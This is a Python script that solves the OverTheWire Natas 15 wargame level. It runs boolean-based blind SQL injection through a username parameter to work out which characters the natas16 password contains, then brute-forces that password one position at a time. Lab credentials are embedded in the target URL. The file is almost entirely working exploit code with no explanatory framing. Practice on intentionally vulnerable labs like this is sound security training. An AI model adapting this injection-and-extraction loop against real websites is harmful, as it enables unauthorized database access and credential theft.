# Library for POST requests and library for Ascii characters.
import string, requests

# All possible characters
all_chars = '0123456789' + string.ascii_lowercase + string.ascii_uppercase

# Parsed characters, the characters that exist in the password
parsed_chars = ''

# Working password
password = ''

# The target URL
target = 'http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/'

# String that says whether we're good
exists = 'This user exists.'

# Verifying we can connect
req = requests.get(target)

if req.status_code != requests.codes.ok:
	raise ValueError('Poof! Unable to connect to target :(')
else:
	print 'Connected to target. Starting character parsing...'

# Verify which characters are part of the working password
for c in all_chars:
	# SQL injection #1
	req = requests.get(target+'?username=natas16" AND password LIKE BINARY "%'+c+'%" "')
	# Verify if password uses character
	if req.content.find(exists) != -1:
		parsed_chars += c
		print 'Chars in pass: ' + parsed_chars

print 'Characters successfully parsed. Starting to brute force...'

# With the assumption passwords are 32 characters long
for i in range(32):
	for c in parsed_chars:
		# SQL injection #2
		req = requests.get(target+'?username=natas16" AND password LIKE BINARY "' + password + c + '%" "')

		# Figuring out characters at the correct position in the pass
		if req.content.find(exists) != -1:
			password += c
			print 'Password: ' + password + '*' * int(32 - len(password))
			break

print 'Successfully brute forced password.'


